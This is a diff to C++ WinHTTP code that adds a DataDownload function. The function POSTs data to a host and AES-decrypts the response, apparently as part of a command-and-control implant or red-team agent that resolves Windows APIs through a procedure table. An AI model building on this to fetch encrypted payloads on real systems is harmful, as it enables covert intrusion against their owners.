@@ -175,6 +175,45 @@ namespace System::Http
 		return respText;
 	}
 
+	std::vector<BYTE> DataDownload(
+		Procs::PPROCS pProcs,
+		Crypt::PCRYPT pCrypt,
+		HINTERNET hConnect,
+		LPCWSTR lpHost,
+		INTERNET_PORT nPort,
+		LPCWSTR lpPath,
+		LPCWSTR lpHeaders,
+		const std::wstring& wSrc
+	) {
+        std::string sSrc = Utils::Convert::UTF8Encode(wSrc);
+
+        System::Http::WinHttpResponse resp = System::Http::RequestSend(
+            pProcs,
+            hConnect,
+            lpHost,
+            nPort,
+            lpPath,
+            L"POST",
+            lpHeaders,
+            (LPVOID)sSrc.c_str(),
+			(DWORD)strlen(sSrc.c_str())
+        );
+        if (!resp.bResult || resp.dwStatusCode != 200)
+        {
+            return std::vector<BYTE>();
+        }
+
+        std::wstring wEnc = System::Http::ResponseRead(pProcs, resp.hRequest);
+        if (wEnc.length() == 0)
+        {
+            return std::vector<BYTE>();
+        }
+
+        // Decrypt the data
+        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pCrypt->pAES->hKey, pCrypt->pAES->iv);
+		return bytes;
+	}
+
 	// Wrapper for send&read&write response.
 	BOOL FileDownload(
 		Procs::PPROCS pProcs,
